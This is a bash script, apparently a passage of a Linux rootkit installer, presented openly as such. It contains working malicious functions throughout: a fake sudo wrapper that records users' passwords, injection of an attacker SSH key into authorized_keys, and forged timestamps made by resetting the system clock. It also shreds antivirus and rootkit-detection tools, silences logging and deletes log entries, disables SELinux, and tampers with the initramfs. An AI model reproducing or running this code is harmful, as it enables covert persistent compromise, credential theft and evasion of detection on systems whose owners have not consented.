#!/usr/bin/env bash

###
#~ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#~ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&//(@@@@@@@@@@@@@@@@@@@
#~ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(//@@@@(/(@@@@@@@@@@@@@@@@
#~ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/#@@@@@@@@//@@@@@@@@@@@@@@@
#~ @@@@@@@@@@@@@//###///@@@@@@@@@@%/#@@@@@@@@@@//@@@@@@@@@@@@@@
#~ @@@@@@@@@@@#/#@@@@@@#/#@@@@@@@@//@@@//@@@@@@//@@@@@@@@@@@@@@
#~ @@@@@@@@@@@@/#@@@@@@#/#@@@@@@@@//@@@@/////////@@@@@@@@@@@@@@
#~ @@@@@@@@@@@@@////////@@@@@@@@@@&//@@@//@@@@//@@@@@@@@@@@@@@@
#~ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@////////%@@@@@@@@@@@@@@@@@
#~ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/%@@@@@@@@@@@@@@@@@@@@@
#~ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@//@@@@&/////&@@@@@@@@@@@
#~ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#/////%@@@@@@@//@@@@@@@@@
#~ @@@@&/@&//@@@@@@//////#@@@@@@@@@@@&//@@@@@@@@@@@@@//@@@@@@@@
#~ @@@@@(//(@@@@@//@@@@@@@//(@@@@@@@@//@@#/#@@@@@@@@%/@@@@@@@@@
#~ @@@@@@@@@@@@@&/@@@@@@@@@@#//@@@@%///@@//@@@@@@@@//@@@@@@@@@@
#~ @@@@@@@@@@@@@&/@@@@@@@@@@@@//&@//@@//@@////@@@///@@@@@@@@@@@
#~ @@@@@@@@@@@@@@//@@@@@@@#/%@@/%//@@@@@(////////@@@@@@@@@@@@@@
#~ @@@@@@@@@@@@@@@//@@@##//%@@///@@@@@@@@@@@@@@@@@@@@@%////&@@@
#~ @@@@@@@@@@@@@@@@%//#@@@@(///@@@@@@@@@@@@@@@@@@@@@@@@////@@@@
#~ @@@@@@@@@@@@@@@@@@@@@@@//%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#~ @@@@@@@@@@@@@@@@@@@@//(@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#~ @@@@@@@@@@@@@@@@///@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#~ @@@@@@@@@@@///(@@@@@@@@@@&/@@//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#~ @@@@@@@@(%@@@@@@@@@@@@@@@@@//%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#~ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
###
update_time(){
	local NOW
	if [[ -f "$1".bak ]]; then
		NOW=$(date) && date --set "$(stat --printf="%z" "$1.bak")" &>/dev/null && touch -c -r "$1".bak "$1" &>/dev/null && shred -zuf -n 1 "$1".bak &>/dev/null && date --set "${NOW}" &>/dev/null
	else
		NOW=$(date) && date --set "$(stat --printf="%z" "$1")" &>/dev/null && cp -f "$1" "$1".bak &>/dev/null && touch -c -r "$1" "$1".bak &>/dev/null && date --set "${NOW}" &>/dev/null
	fi
}

uninstall_av_tools(){
	local i jj d f m dir files modules tmp_lsmod
	necho "\tChecking tools..."
	for i in {"rkhunter","chkrootkit","clamav"}; do
		if [[ -x $(command -v "${i}") ]]; then
			wecho "\t\tDetect [ ${i} ]."
		elif [[ -d /opt/"${i}" || -d /root/"${i}" ]]; then
			wecho "\t\tDetect [ ${i} ] in folders [ /opt/ /root/ ]."
		fi
	done
	secho "\tChecking tools complete."
	necho "\tUninstalling AV..."
	tmp_lsmod=$(awk '{print $1}' /proc/modules)
	for i in ${AVS_I[@]}; do
		IFS=';' read -r -a jj <<< ${!i}
		IFS=: read -r -a dir <<< ${jj[0]}
		IFS=: read -r -a files <<< ${jj[1]}
		IFS=: read -r -a modules <<< ${jj[2]}
		for m in ${modules[@]}; do
			if (( $(grep -c "${m}" <<< "${tmp_lsmod}") != 0 )); then
				wecho "\t\t${i} disable module [ ${m} ]."
				rmmod -f ${m} 2>/dev/null
			fi
		done
		for f in ${files[@]}; do
			if [[ $(pidof "$(basename ${f})") ]]; then
				wecho "\t\t${i} kill running [ ${f} ]."
				kill -9 $(pidof "$(basename ${f})")
			fi
			if [[ -s "${f}" ]]; then
				wecho "\t\t${i} remove file [ ${f} ]."
				shred -zuf -n 1 "${f}"
			fi
		done
		for d in ${dir[@]}; do
			if [[ -d "${d}" ]]; then
				wecho "\t\t${i} remove folder [ ${d} ]."
				rm -rf "${d}"
			fi
		done
	done
	find /lib/modules/ -type f -name avflt* -o -name talpa* -o -name tlp* -o -name kav4fs_oas* -o -name redirfs* -o -name dazuko* -o -name drweb*|while read -r file; do
		shred -zuf -n 1 "${file}" 2>/dev/null
	done
	(( $? != 0 )) && eecho "Something wrong with find LKM modules."
	secho "\tUninstalling AV complete."
}

fakesudo(){
	necho "\t\tCreating Fakesudo. Password in [ /var/tmp/.pass.txt ]."
	mkdir -p /var/tmp/.../
	if (( $(grep -ci "bashrc" ~/.profile) == 0 )); then
		echo -e -n "if [ -n \"\$BASH_VERSION\" ]; then
\t# include .bashrc if it exists
\tif [ -f \"\$HOME/.bashrc\" ]; then
\t\t. \"\$HOME/.bashrc\"
\tfi
fi
" >> ~/.profile
	fi
		echo -e -n "[[ \$1 =~ ^- ]] && {
\t/usr/bin/sudo \$@
\texit
}
[[ -f /var/tmp/.pass.txt ]] || touch /var/tmp/.pass.txt
read -sp \"[sudo] password for \$USER: \" sudopass
(( \$(cat /var/tmp/.pw 2>&1| grep -c \"\${sudopass}\") != 0 )) && {
\t(( \$(echo \"\${sudopass}\" | /usr/bin/sudo -S id -u 2>&1 | grep -ci -e \"^0\$\" -e \"report\" ) != 0 )) && {
\t\tsed -i \"/alias sudo.*/d\" ~/.bashrc\n
\t\techo \"\${sudopass}\" | /usr/bin/sudo -S \$@
\t\trm -- \"\$0\"
\t\texit
\t}
}
echo
sleep 2
echo \"Sorry, try again.\"
echo \"\${sudopass}\" > /var/tmp/.pass.txt
/usr/bin/sudo -p \"[sudo] password for \$USER: \" \$@
" > /var/tmp/.../fakesudo
	chmod u+x /var/tmp/.../fakesudo
	echo "alias sudo=/var/tmp/.../fakesudo" >> ~/.bashrc
	secho "\t\tFakesudo created."
}

sshkey_add(){
	if [[ -w ~/.ssh/authorized_keys ]]; then
		echo "ssh-rsa ${SSHD_NEWKEY}" >> ~/.ssh/authorized_keys
		(( $? != 0 )) && eecho "Couldn't add key to [ ~/.ssh/authorized_keys ]." || secho "\t\tSSH key added."
	fi
}

check_big_problems(){
	local i
	fecho "Search possible problems..."
	SSHD_NEWKEY="<SSHD>"
	if (( $(id -u) != 0 )); then
		wecho "\tWill create current user backdoors."
		if [[ -w ~/ ]]; then
			if [[ ! -e ~/.profile && -w ~/.profile ]]; then
				if [[ ! -e ~/.bashrc && -w ~/.bashrc ]]; then
					fakesudo
				else
					wecho "\t\t[ ~/.bashrc ] is not writable."
				fi
			else
				wecho "\t\t[ ~/.profile ] is not writable."
			fi
			if [[ -f /etc/ssh/sshd_config ]] && (( $(grep -ci "^PubkeyAuthentication\s*no" /etc/ssh/sshd_config) == 0 )); then
				mkdir -p ~/.ssh/
				if [[ ! -e ~/.ssh/ && -w ~/.ssh/ ]]; then
					sshkey_add
				else
					eecho "[ ~/.ssh/ ] is not writable."
				fi
			else
				eecho "[ /etc/ssh/sshd_config ] not found || SSHd not allow connect by ssh_key."
			fi
		else
			eecho "[ ~/ ] is not writable."
		fi
		exit
	fi
	if [[ -f /proc/sys/kernel/printk ]]; then
		printf '0 0 0 0' > /proc/sys/kernel/printk
	fi
	if [[ -f /sys/kernel/debug/sched_features ]]; then
		printf 'NO_RT_RUNTIME_SHARE' > /sys/kernel/debug/sched_features
	fi
	if [[ ! -e /proc ]]; then
		eecho "[ /proc ] doesn't exist."
	fi
	CHATTR_OUTPUT=$(touch /mnt/children && chattr +ia /mnt/children &>/mnt/output && cat /mnt/output)
	chattr -ia /mnt/children &>/dev/null
	if [[ "${CHATTR_OUTPUT}" == *"Inappropriate ioctl"* ]]; then
		shred -zuf -n 1 /mnt/output /mnt/children
		eecho "You're attempting to install on a weird/alien filesystem. This is bad. Bailing."
	fi
	shred -zuf -n 1 /mnt/output /mnt/children &>/dev/null
	if [[ -s /etc/systemd/system.conf ]]; then
		sed -i 's/^#*LogLevel=.*/LogLevel=0/g' /etc/systemd/system.conf &>/dev/null
		systemctl daemon-reexec
		sed -i '$ d' /var/log/messages &>/dev/null
	fi
	for i in ${LOG_FILES[*]}; do
		if [[ -f /var/log/"${i}" ]]; then
			update_time /var/log/"${i}"
		fi
	done
	if [[ ! -x $(command -v sestatus) && ! -s /etc/selinux/config ]]; then
		secho "\tSELinux not found."
	else
		if [[ $(sestatus 2>&1|head -n1 2>/dev/null) =~ "disabled" ]]; then
			secho "\tSELinux is disabled."
		else
			if [[ -x $(command -v setenforce) ]]; then
				setenforce 0 &>/dev/null
				wecho "\tSELinux is temporary disabled."
			fi
		fi
		if [[ -s /etc/selinux/config ]]; then
			if (( $(grep -co "^SELINUX=disabled" /etc/selinux/config 2>/dev/null) == 0 )); then
				update_time /etc/selinux/config
				sed -i "s:^SELINUX=.*:SELINUX=disabled:g" /etc/selinux/config &>/dev/null
				(( $? != 0 )) && eecho "SELinux couldn't be disabled. Check you permissions and ACL."
				update_time /etc/selinux/config
				wecho "\tSELinux WILL BE finally disabled after REBOOT."
			fi
		else
			eecho "SELinux was founded but couldn't found config."
		fi
	fi
	if [[ -s /boot/grub2/grub.conf ]]; then
		GRUB_CONF=/boot/grub2/grub.conf
	elif [[ -s /boot/grub2/grub.cfg ]]; then
		GRUB_CONF=/boot/grub2/grub.cfg
	elif [[ -s /boot/grub/grub.conf ]]; then
		GRUB_CONF=/boot/grub/grub.conf
	elif [[ -s /boot/grub/grub.cfg ]]; then
		GRUB_CONF=/boot/grub/grub.cfg
	else
		eecho "All GRUB configs doesn't exist. You might have to manually find and edit the config file."
	fi
	if [[ -x $(command -v systemctl) ]]; then
		SYSTEMD=1
	elif [[ -x $(command -v service) ]]; then
		SYSTEMD=2
	else
		SYSTEMD=0
	fi
	if [[ -x $(command -v pgrep) ]]; then
		if [[ $(pgrep -f mysqld) ]]; then
			MYSQL=1
		fi
		if [[ $(pgrep -f postgre) ]]; then
			POSTGRES=1
		fi
	else
		wecho "Couldn't found pgrep command."
	fi
	uninstall_av_tools
}

repo(){
	local code_name
	if [[ -x $(command -v yum) && ! -d "${main_tmp}"/sources.list ]]; then
		printf '[main]
cachedir=/var/cache/yum/$basearch/$releasever
keepcache=0
debuglevel=0
logfile=/var/log/yum.log
exactarch=1
obsoletes=1
gpgcheck=0
plugins=0
installonly_limit=2
distroverpkg=centos-release' > "${main_tmp}"/sources.list
	elif [[ -x $(command -v apt-get) && ! -d "${main_tmp}"/sources.list ]]; then
		did=$(lsb_release -i|awk '{print $3}')
		code_name=$(lsb_release -c|awk '{print $2}')
		case ${did,,} in
			"ubuntu")
				echo "deb http://us.archive.ubuntu.com/ubuntu ${code_name} main restricted universe multiverse
deb-src http://us.archive.ubuntu.com/ubuntu ${code_name} main restricted universe multiverse

deb http://us.archive.ubuntu.com/ubuntu ${code_name}-updates main restricted universe multiverse
deb-src http://us.archive.ubuntu.com/ubuntu ${code_name}-updates main restricted universe multiverse

deb http://us.archive.ubuntu.com/ubuntu ${code_name}-backports main restricted universe multiverse
deb-src http://us.archive.ubuntu.com/ubuntu ${code_name}-backports main restricted universe multiverse

deb http://security.ubuntu.com/ubuntu ${code_name}-security main restricted universe multiverse
deb-src http://security.ubuntu.com/ubuntu ${code_name}-security main restricted universe multiverse" > "${main_tmp}"/sources.list
			;;
			"debian")
				echo "deb http://deb.debian.org/debian/ ${code_name} main contrib
deb-src http://deb.debian.org/debian/ ${code_name} main contrib

deb http://deb.debian.org/debian/ ${code_name}-updates main contrib
deb-src http://deb.debian.org/debian/ ${code_name}-updates main contrib

deb http://security.debian.org/ ${code_name}/updates main contrib
deb-src http://security.debian.org/ ${code_name}/updates main contrib" > "${main_tmp}"/sources.list
			;;
		esac
	elif [[ -x $(command -v zypper) ]]; then
		printf ""
	else
		eecho "Not found any package manager."
	fi
}

install_deps(){
	necho "\tInstalling dependencies..."
	if [[ -x $(command -v yum) ]]; then
		REPO="Y"
		yum -y -q -e 0 install ${BASIC_PACKETS[*]} &>/dev/null
		(( $? != 0 )) && eecho "Yum install [ ${BASIC_PACKETS[*]} ] failed."
		dnf config-manager --set-enabled PowerTools &>/dev/null
		(( $? != 0 )) || wecho "\t\tPowerTools enabled."
		yum -y -q -e 0 install ${YUM_LD_DEPS[*]} &>/dev/null
		(( $? != 0 )) && eecho "Yum install [ ${YUM_LD_DEPS[*]} ] failed."
		yum -y -q -e 0 install ${YUM_SSHD_DEPS[*]} &>/dev/null
		(( $? != 0 )) && eecho "Yum install [ ${YUM_SSHD_DEPS[*]} ] failed."
		yum -y -q -e 0 install ${YUM_I_DEPS[*]} &>/dev/null
		(( $? != 0 )) && {
			wecho "\tYum install [ ${YUM_I_DEPS[*]} ] failed.\n\t\tLKM will NOT be installed.\n\t\tWill tried install HORSEPILL or Service."
			DEPS_FAIL=1
		}
		NVER=$(yum --installed list kernel 2>/dev/null|grep -iPo '\d\.[^ ]*'|tail -n1).x86_64
		(( $? != 0 )) && eecho "Couldn't get info about kernel."
		if (( $(grep -ci ${NVER} <<< ${VER}) == 0 )); then
			VER=${NVER}
		fi
		#~ PVER=$(rpm -q pam|awk -F[-] '{print $2}')
		#~ (( $? != 0 )) && eecho "Couldn't get info about PAM."
		#~ if [[ -n ${PVER} ]]; then
			#~ IFS=. read -r FPNUM SPNUM TPNUM <<< "${PVER}"
			#~ if [[ -z ${FPNUM} || -z ${SPNUM} || -z ${TKNUM} ]]; then
				#~ eecho "Check pam version."
			#~ fi
		#~ else
			#~ eecho "Couldn't find pam version."
		#~ fi
		#~ SSHDVER=$(rpm -q openssh|awk -F[-] '{print $2}')
		#~ (( $? != 0 )) && eecho "Couldn't get info about SSHD."
		#~ if [[ -n ${SSHDVER} ]]; then
			#~ IFS=. read -r FPNUM SPNUM <<< "${SSHDVER}"
			#~ if [[ -z ${FPNUM} || -z ${SPNUM} ]]; then
				#~ eecho "Check openssh version."
			#~ fi
		#~ else
			#~ eecho "Couldn't find openssh version."
		#~ fi
		if (( MYSQL == 1 )); then
			yum -c "${main_tmp}"/sources.list -y -q -e 0 install ${YUM_MY_DEPS[*]} &>/dev/null
			(( $? != 0 )) && eecho "Yum install [ ${YUM_MY_DEPS[*]} ] failed."
		fi
		if (( POSTGRES == 1 )); then
			yum -c "${main_tmp}"/sources.list -y -q -e 0 install ${YUM_PG_DEPS[*]} &>/dev/null
			(( $? != 0 )) && eecho "Yum install [ ${YUM_PG_DEPS[*]} ] failed."
		fi
	elif [[ -x $(command -v apt-get) ]]; then
		REPO="A"
		if [[ -x $(command systemctl) ]]; then
			systemctl stop apt-daily &>/dev/null
			(( $? != 0 )) && wecho "\tCouldn't stop apt-daily."
			systemctl disable apt-daily &>/dev/null
			(( $? != 0 )) && wecho "\tCouldn't disable apt-daily."
		fi
		dpkg --add-architecture i386 &>/dev/null
		(( $? != 0 )) && wecho "\tNot added i386 arch."
		apt-get -o Acquire::Check-Date=false -o Dir::Etc::SourceList="${main_tmp}"/sources.list -y update &>/dev/null
		(( $? != 0 )) && eecho "Apt update failed."
		apt-get -o Acquire::Check-Date=false -o Dir::Etc::SourceList="${main_tmp}"/sources.list -y install ${BASIC_PACKETS[*]} &>/dev/null
		(( $? != 0 )) && eecho "Apt install [ ${BASIC_PACKETS[*]} ] failed."
		apt-get -o Acquire::Check-Date=false -o Dir::Etc::SourceList="${main_tmp}"/sources.list -y install ${APT_LD_DEPS[*]} &>/dev/null
		(( $? != 0 )) && eecho "Apt install [ ${APT_LD_DEPS[*]} ] failed."
		apt-get -o Acquire::Check-Date=false -o Dir::Etc::SourceList="${main_tmp}"/sources.list -y install ${APT_SSHD_DEPS[*]} &>/dev/null
		(( $? != 0 )) && eecho "Apt install [ ${APT_SSHD_DEPS[*]} ] failed."
		apt-get -o Acquire::Check-Date=false -o Dir::Etc::SourceList="${main_tmp}"/sources.list -y install ${APT_KLIBC_DEPS[*]} &>/dev/null
		(( $? != 0 )) && wecho "\tCouldn't install [ ${APT_KLIBC_DEPS[*]} ]."
		apt-get -o Acquire::Check-Date=false -o Dir::Etc::SourceList="${main_tmp}"/sources.list -y build-dep klibc &>/dev/null
		(( $? != 0 )) && wecho "\tCouldn't build [ klibc ]." || {
			KVER=$(apt-cache -o Acquire::Check-Date=false -o Dir::Etc::SourceList="${main_tmp}"/sources.list showsrc klibc 2>/dev/null|grep -iP "^Version"|head -n 1|awk -F "[ -]" '{print $2}')
			(( $? != 0 )) && eecho "Couldn't get info about klibc."
			IFS=. read -r FKNUM SKNUM TKNUM <<< "${KVER}"
			if [[ -z ${FKNUM} || -z ${SKNUM} || -z ${TKNUM} ]]; then
				eecho "Check klibc version."
			else
				if (( FKNUM >= 2 && SKNUM >= 0 && TKNUM >= 6 )); then
					HORSEPILL=1
				else
					wecho "\t\tOld klibc version.\n [!]\t\t\tWill installed new version by force."
				fi
			fi
		}
		#~ PVER=$(apt-cache -o Acquire::Check-Date=false -o Dir::Etc::SourceList="${main_tmp}"/sources.list show libpam0g 2>/dev/null|grep -iP "^Version"|head -n 1|awk -F "[ -]" '{print $2}')
		#~ (( $? != 0 )) && eecho "Couldn't get info about PAM."
		#~ if [[ -n ${PVER} ]]; then
			#~ IFS=. read -r FPNUM SPNUM TPNUM <<< "${PVER}"
			#~ if [[ -z ${FPNUM} || -z ${SPNUM} || -z ${TKNUM} ]]; then
				#~ eecho "Check pam version."
			#~ fi
		#~ else
			#~ eecho "Couldn't find PAM version."
		#~ fi
		#~ SSHDVER=$(apt-cache -o Acquire::Check-Date=false -o Dir::Etc::SourceList="${main_tmp}"/sources.list show openssh-server 2>/dev/null|grep -iP "^Version"|head -n 1|awk -F "[ :-]" '{print $4}')
		#~ (( $? != 0 )) && eecho "Couldn't get info about SSHD."
		#~ if [[ -n ${SSHDVER} ]]; then
			#~ IFS=. read -r FPNUM SPNUM <<< "${SSHDVER}"
			#~ if [[ -z ${FPNUM} || -z ${SPNUM} ]]; then
				#~ eecho "Check openssh version."
			#~ fi
		#~ else
			#~ eecho "Couldn't find openssh version."
		#~ fi
		if [[ $(apt-cache -o Acquire::Check-Date=false -o Dir::Etc::SourceList="${main_tmp}"/sources.list search libpcap0.8 2>/dev/null) ]]; then
			apt-get -o Acquire::Check-Date=false -o Dir::Etc::SourceList="${main_tmp}"/sources.list -y install libpcap0.8* &>/dev/null
			(( $? != 0 )) && eecho "Apt install [ libpcap0.8 ] failed."
		fi
		apt-get -o Acquire::Check-Date=false -o Dir::Etc::SourceList="${main_tmp}"/sources.list -y install ${APT_I_DEPS[*]} &>/dev/null
		(( $? != 0 )) && {
			wecho "\t\tAPT install packages failed.\n [!]\t\t\tLKM will NOT be installed.\n [!]\t\t\tWill tried install HORSEPILL or Service."
			DEPS_FAIL=1
		}
		if (( MYSQL == 1 )); then
			apt-get -o Acquire::Check-Date=false -o Dir::Etc::SourceList="${main_tmp}"/sources.list -y install ${APT_MY_DEPS[*]} &>/dev/null
			(( $? != 0 )) && eecho "Apt install [ ${APT_MY_DEPS[*]} ] failed."
		fi
		if (( POSTGRES == 1 )); then
			apt-get -o Acquire::Check-Date=false -o Dir::Etc::SourceList="${main_tmp}"/sources.list -y install ${APT_PG_DEPS[*]} &>/dev/null
			(( $? != 0 )) && eecho "Apt install [ ${APT_PG_DEPS[*]} ] failed."
		fi
	elif [[ -x $(command -v zypper) ]]; then
		REPO="O"
		zypper ar "https://download.opensuse.org/repositories/home:Ledest:misc/openSUSE_Tumbleweed/home:Ledest:misc.repo" &>/dev/null
		(( $? != 0 && $? != 4 )) && eecho "Zypper add repo failed."
		zypper --no-gpg-checks ref &>/dev/null
		(( $? != 0 )) && eecho "Zypper update failed."
		zypper -n in ${BASIC_PACKETS[*]} &>/dev/null
		(( $? != 0 )) && eecho "Zypper install [ ${BASIC_PACKETS[*]} ] failed."
		zypper -n in ${ZYP_LD_DEPS[*]} &>/dev/null
		(( $? != 0 )) && eecho "Zypper install [ ${ZYP_LD_DEPS[*]} ] failed."
		zypper -n in ${ZYP_SSHD_DEPS[*]} &>/dev/null
		(( $? != 0 )) && eecho "Zypper install [ ${PAC_SSHD_DEPS[*]} ] failed."
		zypper -n in ${ZYP_I_DEPS[*]} &>/dev/null
		(( $? != 0 )) && {
			wecho "\t\tZypper install packages failed.\n [!]\t\t\tLKM will NOT be installed.\n [!]\t\t\tWill tried install HORSEPILL or Service."
			DEPS_FAIL=1
		}
		NVER=$(zypper info kernel-default 2>/dev/null|grep -iPo '\d\.\d\.\d-\d'|head -n1)-default
		(( $? != 0 )) && eecho "Couldn't get info about kernel."
		if (( $(grep -ci ${NVER} <<< ${VER}) == 0 )); then
			VER=${NVER}
		fi
		KVER=$(zypper -n info klibc 2>/dev/null|grep -iP "^Version"|head -n 1|awk -F "[:-]" '{print $2}'|tr -d ' ')
		(( $? != 0 )) && eecho "Couldn't get info about klibc."
		if [[ -n ${KVER} ]]; then
			IFS=. read -r FKNUM SKNUM TKNUM <<< "${KVER}"
			if [[ -z ${FKNUM} || -z ${SKNUM} || -z ${TKNUM} ]]; then
				eecho "Check klibc version."
			else
				if (( FKNUM >= 2 && SKNUM >= 0 && TKNUM >= 6 )); then
					HORSEPILL=1
				else
					wecho "\t\tOld klibc version.\n [!]\t\t\tWill installed new version by force."
				fi
			fi
		else
			eecho "Couldn't find klibc version."
		fi
		#~ PVER=$(zypper -n info pam 2>/dev/null|grep -iP "^Version"|head -n 1|awk -F "[:-]" '{print $2}'|tr -d ' ')
		#~ (( $? != 0 )) && eecho "Couldn't get info about PAM."
		#~ if [[ -n ${PVER} ]]; then
			#~ IFS=. read -r FPNUM SPNUM TPNUM <<< "${PVER}"
			#~ if [[ -z ${FPNUM} || -z ${SPNUM} || -z ${TPNUM} ]]; then
				#~ eecho "Check pam version."
			#~ fi
		#~ else
			#~ eecho "Couldn't find PAM version."
		#~ fi
		#~ SSHDVER=$(zypper -n info openssh 2>/dev/null|grep -iP "^Version"|head -n 1|awk -F "[:-]" '{print $2}'|tr -d ' ')
		#~ (( $? != 0 )) && eecho "Couldn't get info about SSHD."
		#~ if [[ -n ${SSHDVER} ]]; then
			#~ IFS=. read -r FPNUM SPNUM <<< "${SSHDVER}"
			#~ if [[ -z ${FPNUM} || -z ${SPNUM} ]]; then
				#~ eecho "Check openssh version."
			#~ fi
		#~ else
			#~ eecho "Couldn't find openssh version."
		#~ fi
		if (( MYSQL == 1 )); then
			zypper -n in ${ZYP_MY_DEPS[*]} &>/dev/null
			(( $? != 0 )) && eecho "Yum install [ ${YUM_MY_DEPS[*]} ] failed."
		fi
		if (( POSTGRES == 1 )); then
			zypper -n in ${ZYP_PG_DEPS[*]} &>/dev/null
			(( $? != 0 )) && eecho "Yum install [ ${YUM_PG_DEPS[*]} ] failed."
		fi
	else
		eecho "Not found any package manager."
	fi
	secho "\tDependencies installing success."
}

purge_deps(){
	necho "\tPurge dependencies..."
	if [[ ${REPO} == "Y" ]]; then
		yum remove -y -q -e 0 ${YUM_P_DEPS[*]} &>/dev/null
		(( $? != 0 )) && eecho "Yum remove [${YUM_P_DEPS[*]}] failed"
	elif [[ ${REPO} == "A" ]]; then
		apt-get -o Acquire::Check-Date=false -o Dir::Etc::SourceList="${main_tmp}"/sources.list -y purge ${APT_P_DEPS[*]} &>/dev/null
		(( $? != 0 )) && eecho "APT remove [ ${APT_P_DEPS[*]} ] failed"
	elif [[ ${REPO} == "O" ]]; then
		zypper rm ${ZYP_P_DEPS[*]} &>/dev/null
	fi
	secho "\tDependencies purging success."
}

check_little_problems(){
	local FILETYPE
	if [[ -f /proc/1/root ]]; then
		eecho "\tCHROOT detected."
	fi
	if [[ -d /proc/xen/ && -f /proc/xen/capabilities ]]; then
		wecho "\tXen detected."
	fi
	if [[ -d /proc/vz/ && -f /proc/bc ]]; then
		wecho "\tOpenVZ detected."
	fi
	if [[ -s /usr/bin/lveps ]]; then
		wecho "\tCloudLinux LVE detected."
	fi
	if (( $(grep -c 'KVM' /proc/cpuinfo) != 0 )) && [[ -f /proc/sysinfo && -f /proc/scsi/scsi ]]; then
		wecho "\tKVM detected."
	fi
	if (( $(grep -ci 'virtualbox' /sys/class/dmi/id/product_name) != 0 )); then
		wecho "\tVirtualBOX detected."
	fi
	if (( $(grep -ci 'vmware' /sys/class/dmi/id/product_name) != 0 )); then
		wecho "\tVmware detected."
	fi
	if (( $(grep -ci 'qemu' /sys/class/dmi/id/sys_vendor) != 0 )); then
		wecho "\tQEMU detected."
	fi
	if [[ $(dmesg) =~ Hypervisor ]]; then
		wecho "\tHypervisor detected."
	fi
	for init_file in {"/boot/initramfs-${VER}.img","/boot/initrd.img-${VER}","/boot/initrd-${VER}","/boot/initramfs-linux.img"}; do
		if [[ -s "${init_file}" ]]; then
			break
		fi
	done
	if [[ -z "${init_file}" ]]; then
		eecho "Couldn't find INIT file. Check [ /boot/ ]."
	fi
	INITR=$(basename ${init_file})
	cd "${init_folder}" 1>/dev/null
		update_time "${init_file}"
		cp "${init_file}" "${INITR}"
		while [[ -s "${INITR}" ]]; do
			FILETYPE=$(file "${INITR}")
			case ${FILETYPE} in
				*gzip*)
					GZ=1
					mv "${INITR}" "${INITR}".gz
					gzip -d "${INITR}".gz 1>/dev/null
					(( $? != 0 )) && eecho "[GZIP]\tSomething wrong extract [ ${INITR}.gz ]." || secho "\t[GZIP]\tExtract [ ${INITR}.gz ] success."
				;;
				*cpio*)
					../TOOLS/skipcpio "${INITR}" > "${INITR}".tmp
					(( $? != 0 )) && eecho 'Something wrong with [ skipcpio ].'
					if [[ -s "${INITR}".tmp ]]; then
						mv "${INITR}".tmp "${INITR}"
					else
						if [[ -x $(command -v cpio) ]]; then
							cpio --quiet -id -H newc --no-absolute-filenames < "${INITR}" 1>/dev/null
							(( $? != 0 )) && eecho "[CPIO]\tSomething wrong extract [ ${init_folder}/${INITR} ]." || secho "\t[CPIO]\tExtract [ ${init_folder}/${INITR} ] success."
						elif [[ -x $(command -v bsdcpio) ]]; then
							bsdcpio -i < "${INITR}" 1>/dev/null
							(( $? != 0 )) && eecho "[CPIO]\tSomething wrong extract [ ${init_folder}/${INITR} ]." || secho "\t[CPIO]\tExtract [ ${init_folder}/${INITR} ] success."
						fi
						shred -zuf -n 1 "${INITR}"*
						(( $? != 0 )) && eecho "[CPIO]\tSomething wrong delete [ ${init_folder}/${INITR} ] && [ ${init_folder}/${INITR}.tmp ]"
					fi
				;;
				*LZ4*)
					LZ4=1
					mv "${INITR}" "${INITR}".lz4
					lz4 --rm -c -d "${INITR}".lz4 > "${INITR}" 2>/dev/null
					(( $? != 0 )) && eecho "[LZ4]\tSomething wrong extract [ ${init_folder}/${INITR}.lz4 ]." || secho "\t[LZ4]\tExtract [ ${init_folder}/${INITR}.lz4 ] success."
				;;
				*XZ*)
					XZ=1
					mv "${INITR}" "${INITR}".xz
					xz -d "${INITR}".xz 1>/dev/null
					(( $? != 0 )) && eecho "[XZ]\tSomething wrong extract [ ${init_folder}/${INITR}.xz ]." || secho "\t[XZ]\tExtract [ ${init_folder}/${INITR}.xz ] success."
				;;
				*)
					eecho "Wrong INIT file format. Check [ ${init_folder}/${INITR} ]."
				;;
			esac
		done
	cd - 1>/dev/null
	PROC_NUM=$(($(grep -i "processor" /proc/cpuinfo|tail -n 1|awk '{print $3}')+1))
	fecho "All looks good."
}
####
gen_f_d_p_s(){
	local l target_file patch_file_tmp patch_dir PATCH NUM rdepth target_dir target_sfile
	case $1 in
		"patch")
			if [[ ! -s "${main_tmp}"/plist ]]; then
				find /{usr,var,lib}/ -not -path "/usr/bin/*" -not -path "/var/lib/lxcfs/*" -not -path "/var/tmp/*" -not -path "/usr/sbin/*" -not -path "/var/log/*" -not -path "/usr/src/*" -mindepth 1 -maxdepth 3 -type f 2>/dev/null|grep -x '.\{18\}' > "${main_tmp}"/plist
			fi
			if [[ -s "${main_tmp}"/plist ]]; then
				while [[ -z "${PATCH}" || -z "${patch_dir}" || -f "${patch_dir}"/"${PATCH}" ]]; do
					patch_file_tmp=$(shuf -n1 "${main_tmp}"/plist)
					patch_dir=$(dirname "${patch_file_tmp}")
					patch_file=$(basename "${patch_file_tmp}")
					NUM=$(shuf -i 1-$((${#patch_file}-2)) -n 1)
					PATCH="${patch_file:0:${NUM}}"$(tr -dc '[:lower:]' <<< /dev/urandom|fold -w1|head -n1)"${patch_file:$((NUM+1)):${#patch_file}}"
					printf "${patch_dir}"/"${PATCH}"
				done
			else
				eecho "No such patches."
			fi
		;;
		"dir")
			rdepth=$(( RANDOM % 4+3 ))
			if [[ ! -s "${main_tmp}"/dlist ]]; then
				find /{usr,var,lib}/ -not -path "/usr/bin/*" -not -path "/var/lib/lxcfs/*" -not -path "/var/tmp/*" -not -path "/usr/sbin/*" -not -path "/var/log/*" -not -path "/usr/src/*" -maxdepth "${rdepth}" -mindepth "${rdepth}" -type d 2>/dev/null|sort -u > "${main_tmp}"/dlist
			fi
			if [[ -s "${main_tmp}"/dlist ]]; then
